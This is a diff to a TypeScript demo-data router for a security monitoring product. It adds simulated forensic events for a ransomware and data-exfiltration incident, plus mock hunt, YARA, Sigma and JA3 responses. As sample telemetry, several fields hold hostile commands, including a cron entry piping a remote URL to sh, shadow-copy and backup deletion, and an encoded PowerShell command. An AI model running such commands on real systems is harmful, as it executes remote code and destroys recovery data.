+    { id: 1023, agent_id: 2, hostname: 'db-server-02', event_type: 'bash', severity: 'critical', created_at: t(2, 13, 0),
+      message: 'pg_dumpall executed: all databases → /tmp/.cache/dump.sql (14.2 GB, 342s)',
+      mitre_technique: 'T1005', mitre_name: 'Data from Local System',
+      details: { cmdline: 'pg_dumpall -U postgres -f /tmp/.cache/dump.sql', pid: 9912, output_size_gb: 14.2, duration_sec: 342 } },
+    { id: 1024, agent_id: 2, hostname: 'db-server-02', event_type: 'file', severity: 'high', created_at: t(2, 13, 10),
+      message: 'Large staged file: /tmp/.cache/dump.sql.gz (4.1 GB compressed, perms 600)',
+      mitre_technique: 'T1074.001', mitre_name: 'Local Data Staging',
+      details: { path: '/tmp/.cache/dump.sql.gz', size_gb: 4.1, compression: 'gzip', permissions: '600', owner: 'postgres' } },
+    { id: 1025, agent_id: 2, hostname: 'db-server-02', event_type: 'dns', severity: 'high', created_at: t(2, 13, 55),
+      message: 'DNS → upload.secure-transfer[.]io (exfil staging domain, TTL 60)',
+      mitre_technique: 'T1048', mitre_name: 'Exfiltration Over Alternative Protocol',
+      details: { query: 'upload.secure-transfer[.]io', response_ip: '185.220.101.35', record_type: 'A', ttl: 60 } },
+    { id: 1026, agent_id: 2, hostname: 'db-server-02', event_type: 'network', severity: 'critical', created_at: t(2, 14, 0),
+      message: 'Exfiltration: 4.3 GB sent to 185.220.101.35:443 over 47 minutes (avg 13.1 Mbps)',
+      mitre_technique: 'T1048', mitre_name: 'Exfiltration Over Alternative Protocol',
+      details: { dst_ip: '185.220.101.35', dst_port: 443, protocol: 'HTTPS', bytes_sent: 4617089024, duration_min: 47, avg_mbps: 13.1 } },
+    { id: 1027, agent_id: 2, hostname: 'db-server-02', event_type: 'alert', severity: 'critical', created_at: t(2, 14, 5),
+      message: 'DLP: 4.3 GB outbound to unclassified IP in 47 min (threshold 1 GB)',
+      mitre_technique: 'T1048', mitre_name: 'Exfiltration Over Alternative Protocol',
+      details: { rule: 'dlp_large_outbound', alert_id: 6634, threshold_gb: 1.0, actual_gb: 4.3, dst_ip: '185.220.101.35' } },
+
+    // ── DAY 1 — Ransomware deployment ──────────────────────────────────────
+    { id: 1028, agent_id: 1, hostname: 'win-workstation-05', event_type: 'service', severity: 'critical', created_at: t(1, 1, 55),
+      message: 'Critical services killed: VSS, MSSQLSERVER, Backup, WSearch (inhibit recovery)',
+      mitre_technique: 'T1490', mitre_name: 'Inhibit System Recovery',
+      details: { stopped_services: ['VSS', 'MSSQLSERVER', 'wuauserv', 'WSearch', 'BackupExecAgentBrowser'], method: 'net stop' } },
+    { id: 1029, agent_id: 1, hostname: 'win-workstation-05', event_type: 'firewall', severity: 'high', created_at: t(1, 1, 50),
+      message: 'Firewall rule added: allow outbound to 185.220.101.0/24 (ransom C2 allow-listed)',
+      mitre_technique: 'T1562.004', mitre_name: 'Disable or Modify System Firewall',
+      details: { rule_name: 'Allow_C2_Out', action: 'allow', direction: 'outbound', dst_cidr: '185.220.101.0/24', port: 'any', added_by: 'NT AUTHORITY\\SYSTEM' } },
+    { id: 1030, agent_id: 1, hostname: 'win-workstation-05', event_type: 'file', severity: 'critical', created_at: t(1, 2, 0),
+      message: 'Mass encryption: 14,223 files renamed .LOCKED (790 files/min) — ransomware active',
+      mitre_technique: 'T1486', mitre_name: 'Data Encrypted for Impact',
+      details: { files_renamed: 14223, extension: '.LOCKED', ransom_note: 'C:\\Users\\jdoe\\Desktop\\READ_ME.txt', encryption: 'AES-256', speed_fps: 47 } },
+    { id: 1031, agent_id: 2, hostname: 'db-server-02', event_type: 'bash', severity: 'critical', created_at: t(1, 2, 0),
+      message: 'Shadow copies deleted: vssadmin delete shadows /all /quiet — 8 snapshots destroyed',
+      mitre_technique: 'T1490', mitre_name: 'Inhibit System Recovery',
+      details: { cmdline: 'vssadmin delete shadows /all /quiet && wbadmin DELETE SYSTEMSTATEBACKUP -deleteOldest', pid: 11234, shadows_deleted: 8 } },
+    { id: 1032, agent_id: 2, hostname: 'db-server-02', event_type: 'file', severity: 'critical', created_at: t(1, 2, 5),
+      message: 'Ransomware spreading: 8,442 files encrypted (.LOCKED) on db-server-02',
+      mitre_technique: 'T1486', mitre_name: 'Data Encrypted for Impact',
+      details: { files_renamed: 8442, extension: '.LOCKED', ransom_note: '/root/READ_ME.txt', encryption: 'AES-256' } },
+    { id: 1033, agent_id: 3, hostname: 'dc-01', event_type: 'firewall', severity: 'high', created_at: t(1, 2, 10),
+      message: 'Domain-wide firewall GPO pushed: AV update servers + backup shares blocked',
+      mitre_technique: 'T1562.001', mitre_name: 'Disable or Modify Tools',
+      details: { gpo: 'FirewallBlock_AV', blocked_hosts: ['update.microsoft.com', 'backup-srv-01', 'av-update.corp.local'], pushed_by: 'xcsupport' } },
+    { id: 1034, agent_id: 1, hostname: 'win-workstation-05', event_type: 'alert', severity: 'critical', created_at: t(1, 2, 15),
+      message: 'RANSOMWARE: Mass file encryption on win-workstation-05 — 14K+ files in 18 minutes',
+      mitre_technique: 'T1486', mitre_name: 'Data Encrypted for Impact',
+      details: { rule: 'ransomware_mass_encryption', alert_id: 7745, files_per_min: 790, agent_isolated: false } },
+
+    // ── TODAY — SOC response ──────────────────────────────────────────────
+    { id: 1035, agent_id: 1, hostname: 'win-workstation-05', event_type: 'login', severity: 'high', created_at: t(0, 3, 0),
+      message: 'Brute-force blocked: 47 failed logins as Administrator from 185.220.101.35 in 60s',
+      mitre_technique: 'T1110', mitre_name: 'Brute Force',
+      details: { username: 'Administrator', source_ip: '185.220.101.35', attempts: 47, duration_sec: 60, blocked: true } },
+    { id: 1036, agent_id: 1, hostname: 'win-workstation-05', event_type: 'user_action', severity: 'info', created_at: t(0, 8, 30),
+      message: 'SOC login: soc-admin from 10.10.5.100 — incident response (INC-2026-0714)',
+      details: { username: 'soc-admin', source_ip: '10.10.5.100', action: 'incident_response_login', ticket: 'INC-2026-0714' } },
+    { id: 1037, agent_id: 1, hostname: 'win-workstation-05', event_type: 'user_action', severity: 'info', created_at: t(0, 8, 35),
+      message: 'Agent isolated: win-workstation-05 — network containment by soc-admin',
+      mitre_technique: 'RS0001', mitre_name: 'Network Isolation',
+      details: { action: 'isolate', initiated_by: 'soc-admin', ticket: 'INC-2026-0714' } },
+    { id: 1038, agent_id: 2, hostname: 'db-server-02', event_type: 'user_action', severity: 'info', created_at: t(0, 8, 40),
+      message: 'Agent isolated: db-server-02 — network containment by soc-admin',
+      details: { action: 'isolate', initiated_by: 'soc-admin', ticket: 'INC-2026-0714' } },
+    { id: 1039, agent_id: 3, hostname: 'dc-01', event_type: 'group_policy', severity: 'info', created_at: t(0, 9, 0),
+      message: 'Emergency GPO pushed: re-enabled Defender, audit logging, disabled backdoor account',
+      details: { action: 'remediation_gpo', gpo: 'EmergencyRestore', disabled_accounts: ['xcsupport'], pushed_by: 'soc-admin' } },
+    { id: 1040, agent_id: 3, hostname: 'dc-01', event_type: 'alert', severity: 'info', created_at: t(0, 9, 15),
+      message: 'ALERT RESOLVED: Domain Compromise — containment verified, investigation ongoing (INC-2026-0714)',
+      details: { alert_id: 5523, resolved_by: 'soc-admin', resolution: 'contained', ticket: 'INC-2026-0714' } },
+  ];
+
+  return events.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
+})();
+
 // ── main router ───────────────────────────────────────────────────────────────
 
 export function demoRoute(
   path:   string,
   method: string,
   sp:     URLSearchParams,
+  body?:  string,
 ): { data: unknown; status: number } {
   const p = path.replace(/^\/api/, '');
 
   // WebSocket ticket — fake it so the WS flow doesn't show a 403 toast
   if (p === '/ws/ticket') return ok({ ticket: 'demo-ws-ticket-noop' });
+
+  // ── Hunt enterprise POST stubs (search/analysis — no state mutation) ────────
+  if (method === 'POST' && p === '/hunt/ai')       return ok({ kql: 'source="endpoint" | where process_name contains "powershell"', explanation: 'Searches for PowerShell execution across all endpoints.', alternative_queries: ['event_type="process_creation" | where parent_process_name contains "office"'], recommended_actions: ['Investigate flagged hosts', 'Cross-reference with YARA matches'], sigma_rule: 'title: PowerShell Execution\nstatus: experimental\nlogsource:\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith: powershell.exe\n  condition: selection', summary: 'Hunt completed. 3 high-confidence PowerShell-based C2 indicators found across 2 hosts.' });
+  if (method === 'POST' && p === '/hunt/ioc')      return ok({ ioc_type: 'ip', value: '185.220.101.47', time_range: '24h', log_hits: [{ source: 'syslog', hostname: 'srv-02', message: 'Connection to 185.220.101.47:443 established', timestamp: new Date().toISOString(), agent_id: 1 }], alert_hits: [{ rule_name: 'C2 Communication Detected', hostname: 'srv-02', severity: 'critical', timestamp: new Date().toISOString() }], conn_hits: [{ hostname: 'srv-02', remote_addr: '185.220.101.47:443', state: 'ESTABLISHED', timestamp: new Date().toISOString() }], total_hits: 3 });
+  if (method === 'POST' && p === '/hunt/ttp')      return ok({ ttp: 'powershell', name: 'PowerShell Execution', mitre: 'T1059.001', tactic: 'Execution', log_hits: [{ hostname: 'WORKSTATION-01', source: 'sysmon', message: 'powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA', timestamp: new Date().toISOString(), agent_id: 2 }], alert_hits: [], total_hits: 1, time_range: '24h' });
+  if (method === 'POST' && p === '/hunt/actor')    return ok({ actor: 'APT29', ioc_hits: [], alert_hits: [], total_hits: 0, time_range: '7d' });
+  if (method === 'POST' && p === '/hunt/export')   return ok({ id: 1, name: 'Demo Hunt', status: 'completed', kql_query: 'source=*', analyst: 'analyst-1', hit_count: 5, severity: 'high', notes: '', started_at: new Date().toISOString() });
+  if (method === 'POST' && p === '/hunt/notebook') return ok({ id: Date.now() });
+  if (method === 'DELETE' && p.startsWith('/hunt/notebook/')) return ok({ ok: true });
+  if (method === 'POST' && p === '/hunt/response') return ok({ queued: true, action: 'isolate_host', target: 'WORKSTATION-01', message: "Response action 'isolate_host' queued for target 'WORKSTATION-01'" });
 
   // All mutations → 403
   if (!['GET', 'HEAD'].includes(method.toUpperCase())) return demoBlock();
@@ -535,7 +1400,13 @@ export function demoRoute(
   if (/^\/incidents\/\d+\/notes$/.test(p))  return ok([]);
 
   // ── Agents ────────────────────────────────────────────────────────────────
-  if (p === '/agents') return ok(D.agents);
+  if (p === '/agents') return ok(D.agents.map((a: any, i: number) => ({
+    ...a,
+    is_isolated:       i === 0,
+    tamper_protection: i === 0 || i === 1,
+    policy_count:      i < 2 ? 3 : 1,
+    open_alert_count:  D.alerts.filter((al: any) => al.agent_id === a.id && al.status === 'open').length,
+  })));
   if (/^\/agents\/\d+$/.test(p)) {
     const id = parseInt(p.split('/')[2]);
     return ok(D.agents.find((a: any) => a.id === id) ?? notFound().data);
@@ -563,18 +1434,22 @@ export function demoRoute(
     const id = parseInt(p.split('/')[2]);
     return ok(D.endpoint_connections.filter((e: any) => e.agent_id === id));
   }
+  if (p === '/timeline') {
+    const limit = parseInt(sp.get('limit') || '500');
+    return ok(FORENSIC_TIMELINE.slice(0, limit));
+  }
   if (/^\/agents\/\d+\/timeline$/.test(p)) {
     const id = parseInt(p.split('/')[2]);
-    // page expects event_type, message, timestamp AND created_at
+    const agentEvents = FORENSIC_TIMELINE.filter((e) => e.agent_id === id);
+    if (agentEvents.length > 0) return ok(agentEvents);
     return ok(D.alerts.filter((a: any) => a.agent_id === id).slice(0, 30).map((a: any) => ({
       id:           a.id,
-      event_type:   a.rule_name   ?? 'alert',
+      event_type:   'alert',
       message:      a.log_message ?? a.rule_name ?? 'Security event',
-      timestamp:    a.created_at,
       created_at:   a.created_at,
       severity:     a.severity,
       agent_id:     a.agent_id,
-      mitre_tactic: a.mitre_tactic,
+      mitre_technique: a.mitre_tactic,
     })));
   }
   if (/^\/agents\/\d+\/vulnerabilities$/.test(p)) {
@@ -582,11 +1457,129 @@ export function demoRoute(
     return ok(D.vulnerabilities.filter((v: any) => v.agent_id === id));
   }
   if (/^\/agents\/\d+\/risk$/.test(p))      return ok({ score: 72, factors: [] });
-  if (/^\/agents\/\d+\/services$/.test(p))  return ok([]);
-  if (/^\/agents\/\d+\/users$/.test(p))     return ok([]);
-  if (/^\/agents\/\d+\/packages$/.test(p))  return ok([]);
+  if (/^\/agents\/\d+\/services$/.test(p)) {
+    const id = parseInt(p.split('/')[2]);
+    const isFirst = id === D.agents[0]?.id;
+    return ok([
+      { service_name: 'sshd',         service_state: 'running', pid: 1234, start_type: 'automatic' },
+      { service_name: 'nginx',         service_state: 'running', pid: 2345, start_type: 'automatic' },
+      { service_name: 'xcloak-agent', service_state: 'running', pid: 3456, start_type: 'automatic' },
+      { service_name: 'cron',          service_state: 'running', pid: 567,  start_type: 'automatic' },
+      { service_name: 'rsyslog',       service_state: 'running', pid: 678,  start_type: 'automatic' },
+      ...(isFirst ? [
+        { service_name: 'cobalt-strike-beacon', service_state: 'running', pid: 9999, start_type: 'manual', suspicious: true },
+      ] : []),
+      { service_name: 'ufw',          service_state: 'running', pid: 789, start_type: 'automatic' },
+    ]);
+  }
+  if (/^\/agents\/\d+\/users$/.test(p)) {
+    return ok([
+      { username: 'root',    uid: 0,    gid: 0,    shell: '/bin/bash',  home: '/root',       last_login: new Date(Date.now() - 3600000).toISOString() },
+      { username: 'ubuntu',  uid: 1000, gid: 1000, shell: '/bin/bash',  home: '/home/ubuntu',last_login: new Date(Date.now() - 86400000).toISOString() },
+      { username: 'svc_web', uid: 1001, gid: 1001, shell: '/sbin/nologin', home: '/var/www', last_login: null },
+      { username: 'nobody',  uid: 65534,gid: 65534,shell: '/sbin/nologin', home: '/nonexistent', last_login: null },
+    ]);
+  }
+  if (/^\/agents\/\d+\/packages$/.test(p)) {
+    return ok([
+      { package_name: 'openssl',    version: '1.0.2k',  arch: 'amd64' },
+      { package_name: 'openssh-server', version: '8.9p1', arch: 'amd64' },
+      { package_name: 'nginx',      version: '1.18.0',  arch: 'amd64' },
+      { package_name: 'curl',       version: '7.81.0',  arch: 'amd64' },
+      { package_name: 'python3',    version: '3.10.6',  arch: 'amd64' },
+      { package_name: 'log4j-core', version: '2.14.1',  arch: 'amd64' },
+      { package_name: 'docker-ce',  version: '20.10.21',arch: 'amd64' },
+      { package_name: 'bash',       version: '5.1-6',   arch: 'amd64' },
+      { package_name: 'sudo',       version: '1.9.9p2', arch: 'amd64' },
+      { package_name: 'libssl1.0.2',version: '1.0.2n',  arch: 'amd64' },
+    ]);
+  }
   if (/^\/agents\/\d+\/auth-logs$/.test(p)) return ok([]);
   if (/^\/agents\/\d+\/filehashes$/.test(p))return ok([]);
+  if (/^\/agents\/\d+\/startup$/.test(p)) {
+    const id = parseInt(p.split('/')[2]);
+    const isFirst = id === D.agents[0]?.id;
+    return ok([
+      { id: 1, name: 'xcloak-agent',       path: '/usr/bin/xcloak-agent-desktop', type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
+      { id: 2, name: 'sshd',               path: '/usr/sbin/sshd',                type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
+      { id: 3, name: 'nginx',              path: '/usr/sbin/nginx',                type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
+      { id: 4, name: 'ufw',               path: '/lib/ufw/ufw-init',              type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
+      ...(isFirst ? [
+        { id: 5, name: '.sys_update',      path: '/tmp/.system/sys_update.sh',    type: 'crontab', enabled: true,  state: 'suspicious', risk: 'critical' },
+        { id: 6, name: 'rc.local beacon', path: '/etc/rc.local',                  type: 'init',    enabled: true,  state: 'suspicious', risk: 'high' },
+      ] : []),
+      { id: 7, name: 'cron',              path: '/usr/sbin/cron',                  type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
+      { id: 8, name: 'rsyslog',           path: '/usr/sbin/rsyslogd',              type: 'systemd', enabled: true,  state: 'active',     risk: 'none' },
+    ]);
+  }
+  if (/^\/agents\/\d+\/usb-history$/.test(p)) {
+    const id = parseInt(p.split('/')[2]);
+    const isFirst = id === D.agents[0]?.id;
+    return ok([
+      ...(isFirst ? [
+        { id: 1, device_name: 'SanDisk Cruzer 16GB', vendor_id: '0781', product_id: '5567', serial: '4C530001370A7070', mount_point: '/media/usb0', event: 'connected',    first_seen: new Date(Date.now() - 3600000 * 2).toISOString(),  last_seen: new Date(Date.now() - 3600000).toISOString(), risk: 'medium' },
+        { id: 2, device_name: 'SanDisk Cruzer 16GB', vendor_id: '0781', product_id: '5567', serial: '4C530001370A7070', mount_point: '/media/usb0', event: 'disconnected', first_seen: new Date(Date.now() - 3600000 * 2).toISOString(),  last_seen: new Date(Date.now() - 3600000).toISOString(), risk: 'medium' },
+      ] : []),
+      { id: 3, device_name: 'Logitech USB Receiver', vendor_id: '046d', product_id: 'c52b', serial: null, mount_point: null, event: 'connected', first_seen: new Date(Date.now() - 86400000 * 5).toISOString(), last_seen: new Date(Date.now() - 86400000 * 5).toISOString(), risk: 'none' },
+    ]);
+  }
+  if (/^\/agents\/\d+\/login-history$/.test(p)) {
+    const id = parseInt(p.split('/')[2]);
+    const isFirst = id === D.agents[0]?.id;
+    return ok([
+      { id: 1, username: 'ubuntu',  tty: 'pts/0', ip: '10.0.2.55',      method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 3600000).toISOString(),     duration_s: 3600 },
+      ...(isFirst ? [
+        { id: 2, username: 'root',  tty: 'pts/1', ip: '185.220.101.47', method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 7200000).toISOString(),     duration_s: 1800, risk: 'critical' },
+        { id: 3, username: 'root',  tty: 'pts/2', ip: '92.118.160.12',  method: 'ssh', status: 'failed',  timestamp: new Date(Date.now() - 7800000).toISOString(),     duration_s: 0,    risk: 'high' },
+        { id: 4, username: 'admin', tty: 'pts/3', ip: '185.220.101.47', method: 'ssh', status: 'failed',  timestamp: new Date(Date.now() - 8000000).toISOString(),     duration_s: 0,    risk: 'high' },
+        { id: 5, username: 'admin', tty: 'pts/4', ip: '10.0.2.55',      method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 86400000).toISOString(),    duration_s: 7200 },
+      ] : [
+        { id: 2, username: 'ubuntu',tty: 'pts/1', ip: '10.0.0.5',       method: 'ssh', status: 'success', timestamp: new Date(Date.now() - 86400000).toISOString(),    duration_s: 1200 },
+      ]),
+    ]);
+  }
+  if (/^\/agents\/\d+\/scheduled-tasks$/.test(p)) {
+    const id = parseInt(p.split('/')[2]);
+    const isFirst = id === D.agents[0]?.id;
+    return ok([
+      { id: 1, name: 'Daily Log Rotation',   command: '/usr/sbin/logrotate /etc/logrotate.conf', schedule: '0 0 * * *',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
+      { id: 2, name: 'System Updates Check', command: '/usr/bin/apt-get update -q',              schedule: '0 6 * * 0',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
+      { id: 3, name: 'Temp Cleanup',         command: '/usr/bin/find /tmp -mtime +7 -delete',    schedule: '0 3 * * *',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
+      ...(isFirst ? [
+        { id: 4, name: 'sys_update',         command: '/tmp/.system/sys_update.sh > /dev/null',  schedule: '*/5 * * * *', user: 'root',   type: 'cron', enabled: true,  risk: 'critical' },
+        { id: 5, name: 'beacon_check',       command: 'curl -s http://185.220.101.47/cmd | sh',  schedule: '*/10 * * * *',user: 'nobody', type: 'cron', enabled: true,  risk: 'critical' },
+      ] : []),
+      { id: 6, name: 'XCloak Health Ping',   command: '/usr/bin/xcloak-agent-desktop --ping',   schedule: '* * * * *',   user: 'root',   type: 'cron', enabled: true,  risk: 'none' },
+    ]);
+  }
+  if (/^\/agents\/\d+\/drivers$/.test(p)) {
+    return ok([
+      { id: 1, name: 'virtio_net',    description: 'VirtIO Network Driver',         version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/drivers/net/virtio_net.ko',    signed: true  },
+      { id: 2, name: 'ext4',          description: 'Ext4 Filesystem Driver',        version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/fs/ext4/ext4.ko',               signed: true  },
+      { id: 3, name: 'virtio_blk',    description: 'VirtIO Block Driver',           version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/drivers/block/virtio_blk.ko',   signed: true  },
+      { id: 4, name: 'iptable_filter',description: 'iptables Filter Table',         version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/net/ipv4/netfilter/',            signed: true  },
+      { id: 5, name: 'usbcore',       description: 'USB Core Driver',               version: '1.0.0',  status: 'loaded',   path: '/lib/modules/5.15/kernel/drivers/usb/core/usbcore.ko',   signed: true  },
+      { id: 6, name: 'rootkit_mod',   description: 'Unknown LKM (unsigned)',         version: '0.0.1',  status: 'loaded',   path: '/tmp/.rootkit/rkit.ko',                                  signed: false, risk: 'critical' },
+    ]);
+  }
+  if (/^\/agents\/\d+\/policies$/.test(p)) {
+    const id = parseInt(p.split('/')[2]);
+    return ok({
+      agent_id:                    id,
+      tamper_protection:           id === D.agents[0]?.id || id === D.agents[1]?.id,
+      collection_interval_seconds: 300,
+      fim_enabled:                 true,
+      fim_paths:                   ['/etc', '/bin', '/usr/bin', '/usr/sbin', '/var/www'],
+      yara_enabled:                true,
+      network_isolation:           id === D.agents[0]?.id,
+      max_cpu_percent:             10.0,
+      log_verbosity:               'info',
+      auto_update:                 false,
+      allowed_usb_devices:         [],
+      block_removable_media:       false,
+      script_execution_blocked:    false,
+    });
+  }
   if (/^\/agents\/\d+\/fim\/alerts$/.test(p)) {
     const id = parseInt(p.split('/')[2]);
     return ok(D.fim_alerts.filter((f: any) => f.agent_id === id));
@@ -624,6 +1617,12 @@ export function demoRoute(
   }
 
   // ── Sigma Rules — stats returns SigmaRuleStat[] ───────────────────────────
+  if (p === '/sigma/dashboard')     return ok(SIGMA_DASHBOARD);
+  if (p === '/sigma/mitre-coverage') return ok(SIGMA_MITRE_COVERAGE);
+  if (p === '/sigma/analytics')     return ok(SIGMA_ANALYTICS);
+  if (p === '/sigma/categories')    return ok(SIGMA_CATEGORIES);
+  if (p === '/sigma/performance')   return ok({ hits_last_hour: 18, hits_last_24h: 247, hits_last_7d: 1432, hourly: [], top_agents: [] });
+  if (p === '/sigma/relationships') return ok(SIGMA_RELATIONSHIPS);
   if (p === '/sigma/rules') {
     let arr = [...D.sigma_rules];
     const search = sp.get('search');
@@ -634,6 +1633,20 @@ export function demoRoute(
     return ok({ data: pg.data, total: pg.total, page: pg.page, limit: pg.per_page });
   }
   if (p === '/sigma/stats') return ok(SIGMA_STATS);
+
+  // ── YARA enterprise ───────────────────────────────────────────────────────
+  if (p === '/yara/dashboard')     return ok(YARA_DASHBOARD);
+  if (p === '/yara/analytics')     return ok(YARA_ANALYTICS);
+  if (p === '/yara/categories')    return ok(YARA_CATEGORIES);
+  if (p === '/yara/performance')   return ok({ rules_evaluated: _yaraRules.length, matches_1h: 3, matches_24h: YARA_DASHBOARD.matches_today, avg_scan_ms: 142, top_files: [] });
+  if (p === '/yara/relationships') return ok(YARA_RELATIONSHIPS);
+  if (/^\/yara\/rules\/\d+\/detail$/.test(p)) {
+    const rid = parseInt(p.split('/')[3]);
+    const rule = _yaraRules.find((r: any) => r.id === rid);
+    if (!rule) return notFound();
+    const rm = _yaraMatches.filter((m: any) => m.rule_name === rule.name);
+    return ok({ rule, matches: rm, match_count: rm.length, last_match: rm[0]?.created_at ?? null });
+  }
 
   // ── YARA ──────────────────────────────────────────────────────────────────
   if (p === '/yara/rules')   return ok(D.yara_rules);
@@ -721,6 +1734,21 @@ export function demoRoute(
     return ok(D.alert_clusters.slice(0, parseInt(sp.get('limit') || '200')));
   }
 
+  // ── JA3 Enterprise ────────────────────────────────────────────────────────
+  if (p === '/ja3/dashboard')      return ok(JA3_DASHBOARD);
+  if (p === '/ja3/analytics')      return ok(JA3_ANALYTICS);
+  if (p === '/ja3/tls-stats')      return ok(JA3_TLS_STATS);
+  if (p === '/ja3/behavioral')     return ok(JA3_BEHAVIORAL);
+  if (p === '/ja3/relationships')  return ok(JA3_RELATIONSHIPS);
+  if (p === '/ja3/threat-intel')   return ok(JA3_THREAT_INTEL);
+  if (p === '/ja3/timeline')       return ok(JA3_TIMELINE);
+  if (p === '/ja3/watchlist')      return ok([]);
+  if (/^\/ja3\/fingerprints\/[a-f0-9]{32}\/detail$/.test(p)) {
+    const hash = p.split('/')[3];
+    const fp   = JA3_NORMALIZED.find((j: any) => j.hash === hash);
+    return fp ? ok({ fingerprint: fp, alerts: [], connections: [], alert_count: 0 }) : notFound();
+  }
+
   // ── JA3 — is_platform field ───────────────────────────────────────────────
   if (p === '/ja3/fingerprints') return ok(JA3_NORMALIZED);
 
@@ -728,6 +1756,89 @@ export function demoRoute(
   if (p === '/canary/tokens') return ok(D.canary_tokens);
   if (p === '/canary/trips')  return ok([]);
   if (p === '/honeyports')    return ok(D.honeyports);
+
+  // ── Hunt Enterprise ──────────────────────────────────────────────────────
+  if (p === '/hunt/dashboard') {
+    const runs = D.hunt_runs as any[];
+    const completed = runs.filter((r: any) => r.status === 'completed').length;
+    const withHits  = runs.filter((r: any) => r.status === 'completed' && r.hit_count > 0).length;
+    return ok({
+      active:        runs.filter((r: any) => r.status === 'running').length,
+      completed,
+      failed:        runs.filter((r: any) => r.status === 'failed').length,
+      total:         runs.length,
+      saved:         (D.hunt_templates as any[]).length,
+      success_rate:  completed > 0 ? Math.round(withHits / completed * 100) : 0,
+      ioc_matches:   runs.reduce((s: number, r: any) => s + (r.hit_count || 0), 0),
+      recent_runs:   runs.slice(0, 10).map((r: any) => ({
+        id: r.id, name: r.name, status: r.status, hit_count: r.hit_count,
+        analyst: r.analyst || 'analyst-1', severity: r.severity || 'medium', started_at: r.started_at,
+      })),
+      top_techniques: [
+        { technique: 'T1071.001', count: 6 }, { technique: 'T1059.001', count: 4 },
+        { technique: 'T1003.001', count: 3 }, { technique: 'T1021', count: 2 },
+        { technique: 'T1486', count: 1 },
+      ],
+      trend: Array.from({ length: 14 }, (_, i) => {
+        const d = new Date(Date.now() - (13 - i) * 86400000);
+        return { date: d.toISOString().slice(0, 10), runs: seededRand(i * 7) % 5, matches: seededRand(i * 11) % 20 };
+      }),
+    });
+  }
+  if (p === '/hunt/analytics') {
+    return ok({
+      analysts: [
+        { analyst: 'analyst-1', runs: 8, total_hits: 34, success_rate: 62 },
+        { analyst: 'analyst-2', runs: 6, total_hits: 18, success_rate: 50 },
+        { analyst: 'analyst-3', runs: 6, total_hits: 12, success_rate: 33 },
+      ],
+      top_templates: (D.hunt_templates as any[]).slice(0, 5).map((t: any) => ({
+        name: t.name, runs: seededRand(t.id * 3) % 8 + 1, hits: seededRand(t.id * 7) % 20,
+      })),
+      daily: Array.from({ length: 30 }, (_, i) => {
+        const d = new Date(Date.now() - (29 - i) * 86400000);
+        return { date: d.toISOString().slice(0, 10), runs: seededRand(i * 5) % 4, matches: seededRand(i * 9) % 15 };
+      }),
+      total_runs: (D.hunt_runs as any[]).length,
+      total_hits: (D.hunt_runs as any[]).reduce((s: number, r: any) => s + (r.hit_count || 0), 0),
+    });
+  }
+  if (p === '/hunt/mitre-coverage') {
+    const covered = ['T1071.001', 'T1059.001', 'T1003.001', 'T1021', 'T1486', 'T1547', 'T1218', 'T1055'];
+    const frequent = ['T1071.001', 'T1059.001'];
+    const tactics = [
+      { id: 'TA0001', name: 'Initial Access',      techniques: [
+        {id:'T1566',name:'Phishing'},{id:'T1190',name:'Exploit Public-Facing App'},{id:'T1195',name:'Supply Chain'},{id:'T1078',name:'Valid Accounts'},{id:'T1199',name:'Trusted Relationship'}] },
+      { id: 'TA0002', name: 'Execution',           techniques: [
+        {id:'T1059',name:'Scripting'},{id:'T1059.001',name:'PowerShell'},{id:'T1204',name:'User Execution'},{id:'T1053',name:'Scheduled Task'},{id:'T1569',name:'System Services'}] },
+      { id: 'TA0003', name: 'Persistence',         techniques: [
+        {id:'T1547',name:'Boot Autostart'},{id:'T1098',name:'Account Manipulation'},{id:'T1136',name:'Create Account'},{id:'T1505',name:'Server Software'},{id:'T1053',name:'Scheduled Task'}] },
+      { id: 'TA0004', name: 'Privilege Escalation',techniques: [
+        {id:'T1548',name:'Abuse Elevation'},{id:'T1134',name:'Access Token'},{id:'T1068',name:'Exploit Vuln'},{id:'T1055',name:'Process Injection'},{id:'T1078',name:'Valid Accounts'}] },
+      { id: 'TA0005', name: 'Defense Evasion',     techniques: [
+        {id:'T1027',name:'Obfuscation'},{id:'T1055',name:'Process Injection'},{id:'T1036',name:'Masquerading'},{id:'T1070',name:'Indicator Removal'},{id:'T1562',name:'Impair Defenses'}] },
+      { id: 'TA0006', name: 'Credential Access',   techniques: [
+        {id:'T1003',name:'Credential Dump'},{id:'T1003.001',name:'LSASS Memory'},{id:'T1110',name:'Brute Force'},{id:'T1552',name:'Unsecured Creds'},{id:'T1558',name:'Kerberos Tickets'}] },
+      { id: 'TA0007', name: 'Discovery',           techniques: [
+        {id:'T1046',name:'Network Scan'},{id:'T1082',name:'System Info'},{id:'T1083',name:'File Discovery'},{id:'T1057',name:'Process Discovery'},{id:'T1016',name:'Network Config'}] },
+      { id: 'TA0008', name: 'Lateral Movement',    techniques: [
+        {id:'T1021',name:'Remote Services'},{id:'T1021.001',name:'RDP'},{id:'T1021.002',name:'SMB Shares'},{id:'T1550',name:'Alt Auth'},{id:'T1570',name:'Lateral Transfer'}] },
+      { id: 'TA0011', name: 'Command & Control',   techniques: [
+        {id:'T1071',name:'App Layer Protocol'},{id:'T1071.001',name:'Web Protocols'},{id:'T1573',name:'Encrypted Channel'},{id:'T1008',name:'Fallback Channels'},{id:'T1095',name:'Non-App Layer'}] },
+      { id: 'TA0040', name: 'Impact',              techniques: [
